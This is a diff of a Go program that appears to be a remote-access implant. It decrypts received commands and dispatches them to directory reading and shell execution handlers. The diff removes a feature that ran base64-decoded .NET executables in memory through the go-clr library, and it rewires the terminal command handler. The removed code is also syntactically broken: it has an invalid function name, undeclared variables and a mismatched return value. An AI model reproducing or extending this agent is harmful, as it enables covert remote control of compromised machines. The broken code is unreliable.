@@ -1,3 +1,4 @@
+
 package main
 
 import (
@@ -19,22 +20,7 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
-    clr "github.com/ropnop/go-clr"
 )
-
-func clr-run (recv_bytes []byte)(){
-    exebytes = recv_bytes
-	if err != nil {
-		log.Fatal(err)
-	}
-	runtime.KeepAlive(exebytes)
-
-	ret, err := clr.ExecuteByteArray(exebytes)
-	if err != nil {
-		log.Fatal(err)
-	}
-	return ret
-}
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -219,11 +205,9 @@ func main() {
 		case "rd":
 			result = readDir(sb1[1])
 		case "terminal":
-			result = terminal(sb1[1])
-		case "dotnet-exe":
-		    result = clr-run(base64.StdEncoding.DecodeString(sb1[1]))// this is expecting a b64 encoded exe byte string
+			commandToRun := strings.Join(sb1, ",")
+			result = terminal(commandToRun)
 		}
-
 		toSend := string(result)
 		fmt.Printf(toSend)
 		toSend = strings.Replace(toSend, "\n", "", -1)
